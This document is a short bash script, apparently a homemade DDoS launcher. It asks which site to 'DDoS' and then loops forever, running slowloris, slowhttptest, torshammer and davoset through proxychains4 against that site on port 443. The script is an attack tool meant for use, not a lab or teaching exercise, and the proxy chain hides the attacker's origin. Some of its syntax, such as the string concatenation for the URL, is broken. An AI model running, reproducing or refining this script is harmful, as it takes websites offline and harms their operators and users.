read -rp "which site do you want to DDoS? not is nessary www.https:// " site
site2 ="https://" + $site
while true;do
	proxychains4 slowloris -dns $site -port 443 -ssl -o 5 -n 10000000000000000000000000000
	proxychains4 slowhttptest -c 1000 -H -g -u $site2 -p 443 -r 100 -w 10 -x 10 -n 100000000000000
	proxychains4 torshammer -t $site2 -p 443 -a 19
	proxychains4 davoset -t $site2  -p 443 -f /path/to/form_data	
	

done
